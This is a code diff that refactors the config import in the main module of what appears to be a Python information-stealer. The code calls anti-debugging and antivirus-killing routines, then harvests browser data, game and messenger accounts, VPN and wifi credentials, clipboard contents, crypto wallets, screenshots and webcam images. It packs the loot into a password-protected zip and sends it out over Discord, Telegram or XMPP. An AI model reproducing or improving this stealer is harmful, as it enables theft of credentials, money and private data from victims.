@@ -27,7 +27,7 @@ from wallets import wallets
 from messengers import skype
 from games import BattleNET
 from games import Uplay
-from config import config
+from config.config import Config
 from manager import ending
 from messengers import viber
 from browsers import chromium
@@ -43,63 +43,63 @@ from system import clipboard
 from browsers import geckodriver
 
 def Start() -> None:
-    if not config.Config.debuging:
-        antiDebug.AntiDebug(config.Config.oneStart,config.Config.avKiller)
-    make_folder.makeFolders(config.Config.enableFileGrubber,config.Config.oneStart)
+    if not Config.debuging:
+        antiDebug.AntiDebug(Config.oneStart,Config.avKiller)
+    make_folder.makeFolders(Config.enableFileGrubber,Config.oneStart)
 def GrubFiles() -> None:
-    if config.Config.enableFileGrubber:
-        config.Config.msgFiles= file_grubber.Grab(config.Config.msgFiles)
+    if Config.enableFileGrubber:
+        Config.msgFiles= file_grubber.Grab(Config.msgFiles)
     else:
         Files_txt.TxtSteal()
     filezilla.FileZilla()
 
 def Browsers() -> None:
     chromium.Browsers()
-    config.Config.msgBrowsers = chromium.Browsers.Return()
-    config.Config.msgBrowsers = geckodriver.GeckoDriver(config.Config.msgBrowsers)
+    Config.msgBrowsers = chromium.Browsers.Return()
+    Config.msgBrowsers = geckodriver.GeckoDriver(Config.msgBrowsers)
 
 def Games() -> None:
-    config.Config.msgOther = epicGames.Epic(config.Config.msgOther)
-    config.Config.msgOther = Uplay.Ubisoft(config.Config.msgOther)
-    config.Config.msgOther = Minecraft.Minecraft(config.Config.msgOther)
-    config.Config.msgOther = roblox.roblox(config.Config.msgOther)
-    config.Config.msgOther = steam.Steam(config.Config.msgOther)
-    config.Config.msgOther =BattleNET.BattleNet(config.Config.msgOther)
+    Config.msgOther = epicGames.Epic(Config.msgOther)
+    Config.msgOther = Uplay.Ubisoft(Config.msgOther)
+    Config.msgOther = Minecraft.Minecraft(Config.msgOther)
+    Config.msgOther = roblox.roblox(Config.msgOther)
+    Config.msgOther = steam.Steam(Config.msgOther)
+    Config.msgOther =BattleNET.BattleNet(Config.msgOther)
 
 def Messagers() -> None:
-    config.Config.msgOther = skype.skype(config.Config.msgOther)
-    config.Config.msgOther = telegram.Telegram(config.Config.msgOther)
-    config.Config.msgOther = viber.Viber(config.Config.msgOther)
-    config.Config.msgOther = discord.Discord(config.Config.msgOther)
-    config.Config.msgOther = whatsapp.WhatsApp(config.Config.msgOther)
-    config.Config.msgOther = pidgin.Pidgin(config.Config.msgOther)
+    Config.msgOther = skype.skype(Config.msgOther)
+    Config.msgOther = telegram.Telegram(Config.msgOther)
+    Config.msgOther = viber.Viber(Config.msgOther)
+    Config.msgOther = discord.Discord(Config.msgOther)
+    Config.msgOther = whatsapp.WhatsApp(Config.msgOther)
+    Config.msgOther = pidgin.Pidgin(Config.msgOther)
 
 def VPN() -> None:
-    config.Config.msgVPN= vpn.VPN(config.Config.msgVPN)
+    Config.msgVPN= vpn.VPN(Config.msgVPN)
 
 def System() -> None:
-    config.Config.msgSYS = system_info.SystemInfo(config.Config.msgSYS)
+    Config.msgSYS = system_info.SystemInfo(Config.msgSYS)
     productkey.PKay()
     wifi.Wifi()
     clipboard.ClipBoard()
 
 
 def Other() -> None:
-    config.Config.msgWallets = wallets.Wallets(config.Config.msgWallets)
+    Config.msgWallets = wallets.Wallets(Config.msgWallets)
     programs.Programs()
     photos.Screenshot()
     photos.WebCam()
 
 def End() -> None:
     try:
-        config.Config.np = clear.makemeZip(config.Config.name,config.Config.password,config.Config.np)
+        Config.np = clear.makemeZip(Config.name,Config.password,Config.np)
     except Exception as e:
         print(e)
     try:
-        send.Send(config.Config.sendType,config.Config.np,config.Config.msgSYS,config.Config.msgBrowsers,config.Config.msgOther,config.Config.msgWallets,config.Config.msgFiles,config.Config.msgVPN,config.Config.discordData,config.Config.TelegramData,config.Config.xmppData)
+        send.Send(Config.sendType,Config.np,Config.msgSYS,Config.msgBrowsers,Config.msgOther,Config.msgWallets,Config.msgFiles,Config.msgVPN,Config.discordData,Config.TelegramData,Config.xmppData)
     except Exception as e:
         print(e)
-    ending.End(config.Config.np)
+    ending.End(Config.np)
 
 def Main()-> None:
     Start()
